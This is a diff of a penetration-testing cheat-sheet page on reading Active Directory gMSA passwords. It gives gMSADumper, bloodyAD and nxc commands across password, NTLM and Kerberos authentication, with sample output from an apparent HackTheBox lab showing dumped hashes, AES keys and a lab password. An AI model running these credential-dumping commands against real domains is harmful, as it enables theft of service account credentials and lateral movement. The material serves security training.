@@ -1,9 +1,14 @@
 ---
 title: "ReadGMSAPassword"
-tags: ["Credential Dumping", "ReadGMSApassword", "Gmsadumper", "Active Directory", "Windows"]
+tags: ["Active Directory", "ReadGMSAPassword", "Credential Dumping", "Gmsadumper", "ReadGMSApassword", "Windows"]
 ---
 
-### Abuse #1: Read GMSAPassword (From Linux)
+{{< filter_buttons >}}
+
+### Read GMSAPassword
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
 #### 1. Set Allowed to Retrieve the Password for this MSA \[Optional\]
 
@@ -13,14 +18,12 @@ Set-ADServiceAccount -Identity "<TARGET_IDENTITY>" -PrincipalsAllowedToRetrieveM
 
 #### 2. Read GMSA Password
 
-{{< tab set1 tab1 >}}gMSADumper{{< /tab >}}
-{{< tab set1 tab2 >}}bloodyAD{{< /tab >}}
-{{< tab set1 tab3 >}}nxc{{< /tab >}}
-{{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active>}}gMSADumper{{< /tab >}}{{< tab set1-1 tab2 >}}bloodyAD{{< /tab >}}{{< tab set1-1 tab3 >}}nxc{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
-python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -l <DC> -d <DOMAIN>
+python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -l <DC>
 ```
 
 ```console {class="sample-code"}
@@ -33,77 +36,182 @@ svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd9284
 svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-python3 gMSADumper.py -u '<USER>' -p '<LM_HASH>:<NT_HASH>' -l <DC> -d <DOMAIN>
+python3 gMSADumper.py -u '<USER>' -p '<LM_HASH>:<NT_HASH>'-d <DOMAIN> -l <DC>
 ```
 
-```console
-# Kerberos
-python3 gMSADumper.py -k -l <DC> -d <DOMAIN>
+```console {class="sample-code"}
+$ python3 gMSADumper.py -u 'ted.graves' -p 'aad3b435b51404eeaad3b435b51404ee:421001de12db5325304b41275a0407b9'-d intelligence.htb -l intelligence.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::745bd2c68dfc101a74f48d87027c7dc6
+svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f
+svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+python3 gMSADumper.py -k -d <DOMAIN> -l <DC> 
+```
+
+```console {class="sample-code"}
+$ python3 gMSADumper.py -k -d intelligence.htb -l intelligence.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::745bd2c68dfc101a74f48d87027c7dc6
+svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f
+svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 ```
 
 <small>*Ref: [gMSADumper](https://github.com/micahvandeusen/gMSADumper)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+{{< tabcontent set1-1 tab2 >}}
 
-```console
+```console {class="password"}
 # Password
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
 ```
 
 ```console {class="sample-code"}
-$ bloodyAD -d intelligence.htb -u ted.graves -p 'Mr.Teddy' --host intelligence.htb get object 'svc_int$' --attr msDS-ManagedPassword 
+$ bloodyAD -d 'intelligence.htb' -u 'ted.graves' -p 'Mr.Teddy' --host 'intelligence.htb' get object 'svc_int$' --attr msDS-ManagedPassword
 
 distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
 msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
 ```
 
-```console
-# Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -k ccache='<USER>.ccache' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```console {class="sample-code"}
+$ bloodyAD -d 'intelligence.htb' -u 'ted.graves' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 --host 'intelligence.htb' get object 'svc_int$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
+msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```
+
+```console {class="sample-code"}
+$ bloodyAD -d 'intelligence.htb' -u 'ted.graves' -p 'Mr.Teddy' -k --host 'intelligence.htb' get object 'svc_int$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
+msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```
+
+```console {class="sample-code"}
+$ bloodyAD -d 'intelligence.htb' -u 'ted.graves' -p '2B576ACBE6BCFDA7294D6BD18041B8FE' -f rc4 -k --host 'intelligence.htb' get object 'svc_int$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
+msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+```
+
+```console {class="sample-code"}
+$ bloodyAD -d 'intelligence.htb' -u 'ted.graves' -k --host 'intelligence.htb' get object 'svc_int$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
+msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R/yj+hgVusvxgnG1OYREO70qnEiCEfP62qLZluS/UHz53T94CItJ+YxA6W5jiWTy0L03JgE1m87NCnxrzGSXHXjp4Ja1OKDde9RrIaqGN7C7cFZth05q1bOOO+x8+jdD1xRXHKgig5LDk4inLQ1xqu7Lc4vT/hIIPx2dbS0FNwGtKu2NTTVAAB/LgVwYnfMNkpti2T0cE8R12HzjGVLV/54GLU1O8iLyXdnfgAQUdnccIlSacJ3XItjjeTWuOwCKQKmc0o8BbE+rHjA5dotmBiBHsE9bw3YsCh0SNTeA==
 ```
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab3 >}}
+{{< tabcontent set1-1 tab3 >}}
 
-```console
+```console {class="password"}
 # Password
-nxc ldap -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <DC> --gmsa
+nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --gmsa
 ```
 
 ```console {class="sample-code"}
-$ nxc ldap -u ted.graves -p 'Mr.Teddy' -d intelligence.htb dc01.intelligence.htb --gmsa
+$ nxc ldap intelligence.htb -d intelligence.htb -u 'ted.graves' -p 'Mr.Teddy' --gmsa
 SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
 LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
 LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-nxc ldap -u '<USER>' -H '<HASH>' -d <DOMAIN> <DC> --gmsa
+nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' --gmsa
 ```
 
-```console
-# Kerberos
-nxc ldap -u '<USER>' -k --use-kcache -d <DOMAIN> <DC> --gmsa
+```console {class="sample-code"}
+$ nxc ldap intelligence.htb -d intelligence.htb -u 'ted.graves' -H '421001DE12DB5325304B41275A0407B9' --gmsa
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:421001DE12DB5325304B41275A0407B9
+LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
+LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
 ```
 
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> --gmsa
+```
+
+```console {class="sample-code"}
+$ nxc ldap intelligence.htb -d intelligence.htb -u 'ted.graves' -p 'Mr.Teddy' -k --kdcHost intelligence.htb --gmsa
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
+LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> --gmsa
+```
+
+```console {class="sample-code"}
+$ nxc ldap intelligence.htb -d intelligence.htb -u 'ted.graves' -H '421001DE12DB5325304B41275A0407B9' -k --kdcHost intelligence.htb --gmsa
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:421001DE12DB5325304B41275A0407B9
+LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
+LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache --gmsa
+```
+
+```console {class="sample-code"}
+$ nxc ldap intelligence.htb -d intelligence.htb -u 'ted.graves' -k --kdcHost intelligence.htb --use-kcache --gmsa
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.10.248    636    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAPS       10.10.10.248    636    DC               [*] Getting GMSA Passwords
+LDAPS       10.10.10.248    636    DC               Account: svc_int$             NTLM: 80d4ea8c2d5ccfd1ebac5bd732ece5e4
+```
+
+{{< /tabcontent >}}
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #2: Save as Cred
+### Save as Cred
 
 {{< tab set2 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
@@ -152,7 +260,7 @@ PS C:\programdata> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurr
 ```
 
 ```console
-$cred = New-Object System.Management.Automation.PSCredential '<TARGET_NAME>', $SecPass
+$cred = New-Object System.Management.Automation.PSCredential '<TARGET_IDENTITY>', $SecPass
 ```
 
 ```console {class="sample-code"}
